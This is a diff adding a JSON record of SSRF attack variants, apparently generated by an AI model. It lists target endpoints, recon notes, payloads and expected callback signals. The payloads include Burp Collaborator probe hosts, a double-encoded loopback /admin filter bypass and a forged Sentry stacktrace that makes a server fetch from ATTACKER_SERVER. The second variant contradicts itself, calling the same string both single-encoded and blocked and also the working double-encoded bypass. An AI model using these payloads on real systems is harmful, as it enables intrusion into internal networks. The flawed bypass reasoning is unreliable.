@@ -1,0 +1,68 @@
+{
+ "key": "ssrf_4",
+ "model": "opencode/glm-5.3-flash-free",
+ "class": "ssrf",
+ "variants": [
+  {
+   "endpoint": "POST /api/integrations/webhooks",
+   "target_param": "webhook_url",
+   "recon_evidence": "Saving an integration triggers an immediate 'test notification' POST to the user-supplied webhook URL; the UI returns the same generic 'Saved' toast whether the URL points at a live host or an RFC 5737 test-net address, indicating no egress feedback.",
+   "planner_rationale": "Blind fetcher with immediate side effect - spend one request on an OOB host to confirm server-side outbound connectivity before deeper probing.",
+   "vuln_class": "ssrf",
+   "payload": "http://BURP-COLLABORATOR-SUBDOMAIN",
+   "injection_point": "body",
+   "expected_success_signal": "DNS resolution plus an HTTP POST (the test-notification body) logged in Burp Collaborator within seconds of saving the integration.",
+   "confidence": 0.92,
+   "reasoning": "The save action makes the server POST directly to whatever URL is stored, and the identical UI response for dead and live hosts shows the fetch is blind. A plain Collaborator hostname is the minimal probe: confirmation requires no visible response, only the OOB log."
+  },
+  {
+   "endpoint": "GET /internal-proxy/fetch",
+   "target_param": "resource",
+   "recon_evidence": "resource=http://127.0.0.1/admin is rejected with 403 'blocked path', and the single-encoded http://127.0.0.1/%2561dmin is also blocked after one decode, indicating the validator normalizes exactly one round of percent-encoding before path matching.",
+   "planner_rationale": "Match the validator's single decode with a doubly encoded path so its check sees no target string while the fetch layer decodes fully.",
+   "vuln_class": "ssrf",
+   "payload": "http://127.0.0.1/%2561dmin",
+   "injection_point": "query",
+   "expected_success_signal": "Proxy returns 200 and relays the internal /admin page (or its auth wall) instead of the generic 403 'blocked path' body.",
+   "confidence": 0.88,
+   "reasoning": "%2561dmin decodes once to %61dmin, which fails the literal 'admin' match, and a second decoding by the fetching layer restores /admin on the loopback host. Bypassing a one-shot-decoding validator requires exactly one extra encoding layer, which is what this payload encodes."
+  },
+  {
+   "endpoint": "POST /ingest/<project>/store/",
+   "target_param": "filename (Sentry stacktrace frame)",
+   "recon_evidence": "The submission endpoint is a Sentry-compatible error store running with source-context fetching enabled, and egress monitoring shows the ingestion backend retrieving arbitrary URLs named in stacktrace frames while ingress filtering blocks direct internal requests.",
+   "planner_rationale": "Turn the error pipeline itself into the SSRF primitive: forge a report whose frame filename is an attacker-controlled URL.",
+   "vuln_class": "ssrf",
+   "payload": "{\"exception\":{\"values\":[{\"stacktrace\":{\"frames\":[{\"filename\":\"https://ATTACKER_SERVER/oob.js\"}]}}]}}",
+   "injection_point": "body",
+   "expected_success_signal": "HTTP GET for /oob.js arriving at ATTACKER_SERVER from the ingestion service's egress IP after the crafted report is accepted.",
+   "confidence": 0.87,
+   "reasoning": "Sentry resolves source files listed in stacktrace frame filenames without restricting scheme or host, so the JSON body alone fully determines the outbound request. The egress-allowed/ingress-filtered asymmetry makes this the one channel where a callback from the victim network is obtainable."
+  },
+  {
+   "endpoint": "GET /render/preview",
+   "target_param": "X-Preview-Source (header)",
+   "recon_evidence": "The renderer's worker logs show 'fetching preview source' taken verbatim from the client-controlled X-Preview-Source header; unreachable values hang for ~30s then return sender-invariant HTML, i.e. no differential feedback for live vs. dead hosts.",
+   "planner_rationale": "Header-driven fetch with blind behavior - confirm with a low-cost OOB hostname before spending requests on internal targets.",
+   "vuln_class": "ssrf",
+   "payload": "http://BURP-COLLABORATOR-SUBDOMAIN",
+   "injection_point": "header",
+   "expected_success_signal": "DNS+HTTP interaction logged in Burp Collaborator coming from the renderer's worker egress IP.",
+   "confidence": 0.85,
+   "reasoning": "The fetch source is read from a request header with no observable response difference, so a Collaborator hostname is the correct first probe: the OOB log is the only channel that can confirm the fetch actually happened."
+  },
+  {
+   "endpoint": "GET /legacyproxy/{url}",
+   "target_param": "url (path remainder)",
+   "recon_evidence": "Route configuration rewrites /legacyproxy/<remainder> by treating the trailing path portion as a fully qualified destination URL, and no scheme or host allowlist was observed when the legacy proxy relayed a public HTTP source during enumeration.",
+   "planner_rationale": "Cheapest confirmation: OOB hostname through the unvalidated path-based forwarder to prove arbitrary outbound requests.",
+   "vuln_class": "ssrf",
+   "payload": "http://BURP-COLLABORATOR-SUBDOMAIN",
+   "injection_point": "path",
+   "expected_success_signal": "DNS resolution and HTTP request logged in Burp Collaborator referencing the legacy proxy's egress IP as the client.",
+   "confidence": 0.8,
+   "reasoning": "A forwarder that accepts the destination as a free-form path suffix with no observed allowlist will relay any URL supplied. Confirming with a Collaborator hostname avoids depending on any response-side behavior of the legacy proxy."
+  }
+ ],
+ "raw_tail": "logged in Burp Collaborator referencing the legacy proxy's egress IP as the client.\",\n    \"confidence\": 0.8,\n    \"reasoning\": \"A forwarder that accepts the destination as a free-form path suffix with no observed allowlist will relay any URL supplied. Confirming with a Collaborator hostname avoids depending on any response-side behavior of the legacy proxy.\"\n  }\n]\n\u001b[0m\n> build · glm-5.3-flash-free\n"
+}
